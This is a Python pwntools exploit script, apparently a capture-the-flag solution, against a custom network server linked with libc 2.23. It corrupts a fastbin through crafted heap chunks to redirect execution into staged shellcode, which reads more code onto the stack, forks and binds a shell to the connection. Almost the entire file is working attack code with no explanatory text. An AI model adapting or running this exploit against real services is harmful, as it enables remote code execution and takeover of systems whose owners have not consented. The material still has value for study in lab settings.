#!/usr/bin/env python
# coding: utf-8

from pwn import *

context.terminal = ['mate-terminal', '--maximize', '-x', 'sh', '-c']
#context.terminal = ['tmux', 'splitw', '-h']
#context.terminal = ['tmux', 'splitw', '-v']
#context.log_level = 'debug'
context.arch = 'amd64'

s = process(('./server', '12000'), env={'LD_PRELOAD': './libc-2.23.so'})
#gdb.attach(s, gdbscript=open('pie.x'))
#p = remote('192.168.1.144', 12000)
p = remote('127.0.0.1', 12000)
#p = remote('202.112.50.114', 12000)

# aggressive alias

r = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
se = lambda x: p.send(x)
sel = lambda x: p.sendline(x)
pick32 = lambda x: u32(x[:4].ljust(4, '\0'))
pick64 = lambda x: u64(x[:8].ljust(8, '\0'))

def build(action, payload):
    return p32(action) + p32(len(payload)) + payload + p32(0)

def type7(payload):
    return build(7, p32(len(payload)) + payload)

payload = p32(0) + p32(3) + '\0' * 3 + p32(0)
se(payload)

fastbin_fd = 0x605035 - 8
stage1 = 0x605040
stage2 = 0x605140

se(type7(cyclic(0x808) + '\x80\x1a\0\0' + '\0\0\0\0' + p64(0) + p64(0x75) + 'A' * (0x70 - 0x10) + p64(0) + p64(0x25) + p64(0) + p64(0) + p64(0) + p64(0x25)))
se(build(6, ' '))
se(build(6, ' '))

se(type7('B' * (0x100 - 8)))
se(build(6, 'C' * (0x300 - 8)))
se(build(6, 'D' * (0x300 - 8)))

payload = 'E' * 0x190 + p64(0) + p64(0x75) + p64(fastbin_fd)
se(build(6, payload.ljust(0x200 - 8, '\0')))

se(build(6, 'F' * (0x70 - 8)))

import pwnlib.shellcraft.amd64.linux as shellcode
sc1 = 'GGG'
sc1 += asm('xor r15, r15\nmov r14, 0x608150\nmov r15d, [r14]\n' + shellcode.read('r15', 'rsp', 0x100) + '\njmp rsp').ljust(0x30, '\0')
sc1 += p64(stage1)
sc1 = sc1.ljust(0x70 - 8, '\0')
se(build(6, sc1)[:-4])

sc2 = shellcode.fork()
sc2 += 'cmp rax, 0\njnz exit\nxor r15, r15\nmov r14, 0x608150\nmov r15d, [r14]\n' + shellcode.dupsh('r15')
sc2 += 'exit: ' + shellcode.syscall('SYS_exit', 0)
sc2 = asm(sc2).ljust(0x100, '\0')
se(sc2)

p.interactive()
